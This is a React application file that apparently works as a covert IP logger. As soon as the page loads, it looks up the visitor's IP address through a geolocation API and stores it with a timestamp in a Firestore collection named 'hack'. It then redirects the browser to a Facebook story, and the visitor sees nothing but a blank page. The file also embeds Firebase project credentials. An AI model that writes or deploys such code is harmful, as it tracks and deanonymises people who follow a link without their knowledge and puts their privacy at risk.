import "./App.css";
import { useState, useEffect } from "react";
import axios from "axios";
import Iframe from "react-iframe";
import firebase from "firebase/compat/app";
import "firebase/compat/firestore";

firebase.initializeApp({
  apiKey: "AIzaSyC9bA5NKsStcYRPDDTJFQbFUI1oCX2tq4I",
  authDomain: "thobor-9436b.firebaseapp.com",
  projectId: "thobor-9436b",
  storageBucket: "thobor-9436b.appspot.com",
  messagingSenderId: "496274391107",
  appId: "1:496274391107:web:f1711686e690bab69fd4f6",
});

const firestore = firebase.firestore();
const hack = firestore.collection("hack");

function App() {
  //creating IP state
  const [ip, setIP] = useState("");

  //creating function to load ip address from the API
  const getData = async () => {
    const res = await axios.get("https://geolocation-db.com/json/");
    console.log(res.data);
    // setIP(res.data.IPv4);
    await hack
      .add({
        ip: res.data.IPv4,
        createAt: firebase.firestore.FieldValue.serverTimestamp(),
      })
      .then((res) => {
        console.log(res);
        window.location.href =
          "https://m.facebook.com/story.php?story_fbid=pfbid0ZJbYTsR868ySqAUCwXTzqz3TbonC7PwKLyuWLEHhxrmmqH8yZtYhaQjgzFuRCR7Ul&id=100075758240162 ";
      });
  };

  useEffect(() => {
    getData();
  }, []);

  return <div className="App"></div>;
}

export default App;
